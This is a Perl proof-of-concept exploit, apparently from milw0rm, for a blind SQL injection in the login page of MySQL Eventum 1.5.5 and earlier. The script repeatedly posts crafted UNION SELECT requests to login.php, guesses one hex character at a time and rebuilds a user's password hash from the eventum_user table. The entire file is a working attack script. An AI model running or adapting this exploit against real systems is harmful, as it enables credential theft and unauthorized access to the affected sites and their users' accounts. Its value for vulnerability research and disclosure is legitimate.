#!/usr/bin/perl -w
use IO::Socket;
use strict;

print "#################################\n";
print "#  MySQL Eventum <= v1.5.5 SQL Injection PoC  #\n";
print "#   James Bercegay // gulftech.org // 7-28-05      #\n";
print "#################################\n";

my $host = 'localhost';
my $path = '/eventum/login.php';
my $user = '2';
my $port = 80;
my $pass = '';

my @char = ('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');

print "[*] Trying $host\n";

OUTER: for ( my $i = 1; $i < 33; $i++ ) 
{
INNER: for ( my $j=0; $j < 16; $j++ )
{
my $used = $char[$j];
my $sock = IO::Socket::INET->new( PeerAddr => $host, PeerPort => $port, Proto => 'tcp' ) || die "[!] Unable to connect to $host\n";

my $post = "cat=login&url=&email=%27+UNION+SELECT+%273355d92c04a3332339b767f9278405ff%27+FROM+eventum_user+WHERE+usr_id=$user+AND+MID(usr_password,$i,1)='$used'%2F*&passwd=dance&Submit=Login";
my $send = "POST $path HTTP/1.1\r\n";
$send .= "Host: $host\r\n";
$send .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6\r\n";
$send .= "Connection: Keep-Alive\r\n";
$send .= "Content-type: application/x-www-form-urlencoded\r\n"; 
$send .= "Content-length: ".length($post)."\r\n\r\n";
$send .= "$post\r\n\r\n";

print $sock $send;

while ( my $line = <$sock> )
{
if ( $line =~ /(.*)err=7(.*)/is )
{
$pass .= $used;
print "[+] Char $i is $used\n";
last INNER;
} 
#/if
}
#/while

close($sock);
}
#/for INNER

if ( length($pass) < 1 ) 
{
print "[!] Host not vulnerable!";
exit;
}
}
#/for OUTER

print "[+] Pass hash is $pass\n";
exit;

# milw0rm.com [2005-08-05] 